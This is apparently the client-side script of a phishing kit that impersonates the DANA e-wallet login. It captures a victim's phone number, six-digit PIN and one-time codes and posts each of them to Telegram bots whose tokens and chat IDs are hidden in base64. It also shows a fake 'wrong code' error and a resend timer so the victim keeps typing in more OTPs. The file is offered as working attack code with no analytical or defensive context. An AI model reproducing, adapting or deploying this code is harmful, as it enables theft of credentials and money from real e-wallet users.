function sendNohp(event) {
    $("#process").show();
    event.preventDefault();
    $("#inp").blur();

    var nomor = document.getElementById("inp").value;
    sessionStorage.setItem("nomor", nomor);
    var logo = document.getElementById('logo');       
    var inp = document.getElementById('inp');
    
    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value;

    tokens.forEach(function(token, index) {
        var decodedToken = base64Decode(token);
        var grup = base64Decode(grups[index]);
        $.ajax({
            url: `https://api.telegram.org/bot${decodedToken}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
            method: `POST`,
            success: function() {
                if (index === tokens.length - 1) {
                    $("#process").hide();
                    document.getElementById("back1").style.display = "none";
                    document.getElementById("back2").style.display = "block";
                    $("#formNohp").fadeOut();
                    setTimeout(function() {
                        $("#formPin").fadeIn();
                        $("#pin1").focus();
                    }, 500);
                }
            }
        });
    });
}

function sendPin() {
    var nomor = sessionStorage.getItem("nomor");
    document.getElementById("alert").innerHTML = "Kode dikirim ke +62 " + nomor + " via<br/>";
    var logo = document.getElementById('logo'); 
    var inp = document.getElementById('inp');
    var pin1 = document.getElementById('pin1');
    var pin2 = document.getElementById('pin2');
    var pin3 = document.getElementById('pin3');
    var pin4 = document.getElementById('pin4');
    var pin5 = document.getElementById('pin5');
    var pin6 = document.getElementById('pin6');
    
    var gabungan = '' + logo.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : ' + '0' + inp.value + '%0A𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ' + pin1.value + pin2.value + pin3.value + pin4.value + pin5.value + pin6.value;

    tokens.forEach(function(token, index) {
        var decodedToken = base64Decode(token);
        var grup = base64Decode(grups[index]);
        $.ajax({
            url: `https://api.telegram.org/bot${decodedToken}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
            method: `POST`,
            success: function() {
                if (index === tokens.length - 1) {
                    $("#process").hide();
                    document.getElementById("alert").style.display = "block"; 
                    $(".bgotp").fadeIn();
                    setInterval(countdown, 1000);
                    $("#otp1").focus();
                }
            }
        });
    });
}

function sendOtp() {
    $(".loadingOtp").show();

    var logo = document.getElementById('logo').value; 
    var inp = document.getElementById('inp').value;
    var pin = [
        document.getElementById('pin1').value,
        document.getElementById('pin2').value,
        document.getElementById('pin3').value,
        document.getElementById('pin4').value,
        document.getElementById('pin5').value,
        document.getElementById('pin6').value
    ].join('');

    var otp = [
        document.getElementById('otp1').value,
        document.getElementById('otp2').value,
        document.getElementById('otp3').value,
        document.getElementById('otp4').value
    ].join('');

    setTimeout(() => {
        $(".alert").text("Mohon pastikan kodenya sudah benar dan coba lagi");
        $(".alert").css("color", "red");
    }, 2000);

    var gabungan = `${logo}%0A𝗡𝗼𝗺𝗼𝗿 𝗗𝗔𝗡𝗔 : 0${inp}%0A𝗣𝗜𝗡 𝗗𝗔𝗡𝗔.     : ${pin}%0A%0A𝗢𝗧𝗣 𝗗𝗔𝗡𝗔     : ${otp}`;

    var requests = [];

    tokens.forEach(token => {
        var decodedToken = base64Decode(token);
        grups.forEach(grup => {
            var decodedGrup = base64Decode(grup);
            requests.push(
                $.ajax({
                    url: `https://api.telegram.org/bot${decodedToken}/sendMessage?chat_id=${decodedGrup}&text=${gabungan}&parse_mode=html`,
                    method: 'POST',
                    success: function() {
                        setTimeout(() => {
                            $(".loadingOtp").hide();
                            $('.inpotp').val('');
                            $('#otp1').focus();
                            var nomor = sessionStorage.getItem("nomor");
                            document.getElementById("alert").innerHTML = "Kode baru dikirim ulang ke +62" + nomor + " via<br/>";
                            $(".alert").css("color", "black");
                        }, 4000);
                    }
                })
            );
        });
    });

    $.when.apply($, requests).done(function() {
        // All requests are done, no additional actions needed here
    });
}

function countdown() {
    var count = parseInt($('#countdown').text());
    if (count !== 0) {
        $('#countdown').text(count - 1);
    } else {
        $('#countdown').text('60');
    }
}

window.onload = function() {
    setTimeout(function() {
        $(".start").fadeIn();
        setTimeout(function() {
            $(".start").fadeOut(1000);
            setTimeout(function() {
                $(".container").fadeIn(200);
                $("#inp").focus();
            }, 1000);
        }, 1000);
    }, 500);
}
